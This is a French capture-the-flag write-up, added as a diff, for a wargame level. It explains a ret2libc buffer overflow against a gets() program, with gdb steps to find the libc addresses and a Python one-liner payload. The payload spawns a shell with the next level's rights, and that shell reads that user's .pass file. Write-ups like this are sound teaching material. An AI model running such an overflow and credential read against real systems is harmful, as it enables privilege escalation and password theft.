@@ -1,0 +1,33 @@
+1. Le dossier contient un executable, si je le decompile, j'obtiens un simple programme qui fais un gets en c.
+2. Apres des recheches sur internet, je vois que gets est connu pour etre tres vulnerable puisqu'il ne verifie pas la taille du parametre qu'il lit, qui permet de facilement buffer-overflow.
+3. Pour buffer-overflow. il faut manipuler la fin de la call-stack du programme, c'est a dire l'eip, l'eip signifie "Extended Instruction Pointer". C'est un registre du CPU qui contient l'adresse de la prochaine instruction à exécuter.
+4. Nous allons donc manipuler la callstack, nous allons envoyer un buffer superieur a 76 (taille du buffer lu par gets dans le programme source), ce qui nous permettra de manipuler l'eip, et donc de pouvoir lancer un shell, avec les droit utilisateur de level2.
+5. Pour cela, je vais recuperer l'adresse des fonctions system, et "bin/sh" grace a gdb 
+ ```
+ gdb ./level1
+(gdb) break main
+(gdb) run
+(gdb) p system
+(gdb) info proc mappings -> to get start and end adresse
+(gdb) (gdb) find 0xb7e00000 (start address), 0xb7fc0000( end address), "/bin/sh"
+```
+on lance le programme pour charger la libc, et ensuite pouvoir recuperer les adresses.
+p renvoie le pointeur du symbole. find, cherche a la sequence d'octet "bin/sh" dans l'adresse memoire de la libc
+6. On vas pouvoir construire l'exploit:
+
+(python -c "print('A'*76 + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7')";cat) | ./level1
+
+Explication de l'exploit: 
+
+- on rempli le buffer lu par gets en affichant 76 'A' pour atteindre l'eip
+- on met l'adresse de system sur l'eip
+- on bypass la return adress de system
+- et on mets l'adresse de '/bin/sh' a l'adresse d'arguments de system
+
+7. Ensuite on peut lance le programme python dans Resources, en entre du programme source ce qui nous permet d'avoir un shell avec les droits de level2, et donc d'afficher le mdp de level2 -> 
+```
+(./exploit; cat) | ./level1
+cat /home/user/level2/.pass
+```
+cat apres exploit -> permet de garder le shell ouvert
+
